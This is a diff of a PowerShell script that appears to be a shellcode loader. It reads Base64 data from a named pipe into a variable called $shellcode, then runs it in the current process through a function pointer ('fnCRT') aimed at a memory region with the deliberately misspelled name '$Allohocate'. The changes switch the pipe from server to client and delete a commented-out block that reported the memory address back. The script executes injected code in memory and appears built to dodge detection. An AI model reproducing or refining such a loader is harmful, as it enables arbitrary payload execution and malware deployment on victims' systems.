@@ -46,10 +46,10 @@ $startMain = [Main]
 
 #PIPING
 $pipeName = "Pipe1"
-$pipe = New-Object System.IO.Pipes.NamedPipeServerStream(".", $pipeName, [System.IO.Pipes.PipeDirection]::In)
+$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", $pipeName, [System.IO.Pipes.PipeDirection]::In)
 
-#$pipe.Connect()
-$pipe.WaitForConnection()
+$pipe.Connect()
+
 
 $bytes = New-Object byte[] 4096
 $bytesRead = $pipe.Read($bytes, 0, $bytes.Length)
@@ -60,16 +60,17 @@ $pipe.Close()
 
 #SECOND CON
 
-$pipe = New-Object System.IO.Pipes.NamedPipeServerStream(".", $pipeName, [System.IO.Pipes.PipeDirection]::In)
+$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", $pipeName, [System.IO.Pipes.PipeDirection]::In)
 
-#$pipe.Connect()
-$pipe.WaitForConnection()
+$pipe.Connect()
+
 
 $bytes = New-Object byte[] 4096
 $bytesRead = $pipe.Read($bytes, 0, $bytes.Length)
 
 $enc = [System.Text.Encoding]::UTF8.GetString($bytes, 0, $bytesRead)
 [Byte[]]$shellcode = [System.Convert]::FromBase64String($enc)
+
 
 
 
@@ -100,13 +101,7 @@ $NEWO | Add-Member NoteProperty -Name fnCRT -Value $IDK
 $p=0
 $o = $NEWO.fnCRT.Invoke(-1, 0, 0, $Allohocate, 0, 0, 0, [ref]$p)
 
-#PIPE SERVER
-#$pipeName = "Pipe2"
-#$pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::Out)
-#$pipe.WaitForConnection()
-#$bytes = [System.Text.Encoding]::UTF8.GetBytes($Allohocate)
-#$pipe.Write($bytes, 0, $bytes.Length)
-#$pipe.Close()
+
 
 
   
